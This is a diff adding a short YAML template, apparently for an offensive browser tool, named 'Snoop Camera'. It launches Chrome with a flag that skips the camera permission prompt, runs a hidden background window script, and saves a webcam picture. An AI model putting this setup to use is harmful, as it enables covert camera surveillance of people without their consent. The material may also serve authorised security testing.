@@ -1,0 +1,18 @@
+info:
+  name: Snoop Camera
+  usage: |
+    voodoo template ./snoop/camera -o pic.jpg
+    voodoo template ./snoop/camera -o pic.jpg --params size:1000
+scripts:
+  - file: snoop-camera.js
+  - file: ../hide-window.js
+    background: true
+    communication: false
+
+format: payload:base64decode
+
+browser:
+  default: chrome
+  flags: --use-fake-ui-for-media-stream
+  urls:
+    - https://example.com
